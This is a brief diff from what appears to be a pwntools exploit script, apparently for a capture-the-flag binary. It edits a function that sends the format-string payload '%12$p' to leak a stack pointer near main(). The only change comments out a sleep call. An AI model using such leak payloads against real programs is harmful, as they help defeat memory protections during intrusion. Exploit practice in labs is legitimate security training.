@@ -67,7 +67,7 @@ def detect():
 def leak_pointer_to_main():
 	'''12th pointer is one from the main()'''
 	io.sendline(b"%12$p")
-	sleep(0.2)
+	#sleep(0.2)
 	io.recvuntil(b"> ")
 	leak_all = io.recv()
 	leak = leak_all.decode().split("\n")[0]
